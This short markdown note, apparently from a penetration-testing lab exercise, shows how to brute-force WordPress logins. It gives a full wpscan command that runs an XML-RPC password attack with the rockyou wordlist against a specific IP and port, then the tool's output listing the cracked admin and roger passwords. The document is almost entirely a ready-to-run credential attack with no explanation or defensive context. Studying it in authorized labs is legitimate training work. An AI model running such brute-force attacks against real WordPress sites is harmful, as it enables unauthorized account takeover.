# Wpscan User Bruteforce

## Attacking WordPress Users
### WordPress User Bruteforce
```shell
┌──(root㉿kaljfou)-[~]
└─# wpscan --password-attack xmlrpc -t 20 --usernames admin,roger --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --url http://154.57.164.82:31010                  _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://154.57.164.82:31010/ [154.57.164.82]
[+] Started: Mon Apr 20 17:34:26 2026

Interesting Finding(s):
[...]
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - admin / sunshine1
[SUCCESS] - roger / lizard
Trying roger / lizard Time: 00:00:46 <                                                                                                            > (2540 / 28691322)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: sunshine1
 | Username: roger, Password: lizard
[...]
```